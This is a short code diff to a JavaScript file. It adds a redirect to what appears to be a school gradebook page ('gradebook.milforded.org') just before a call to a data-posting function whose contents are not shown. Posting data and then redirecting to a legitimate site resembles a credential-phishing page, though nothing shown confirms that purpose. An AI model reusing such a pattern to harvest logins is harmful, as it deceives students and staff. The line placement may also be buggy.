@@ -31,4 +31,5 @@ async function postData() {
     console.error("Error posting data:", error);
   }
 }
+window.location.href = "https://gradebook.milforded.org/home.html"
 postData();
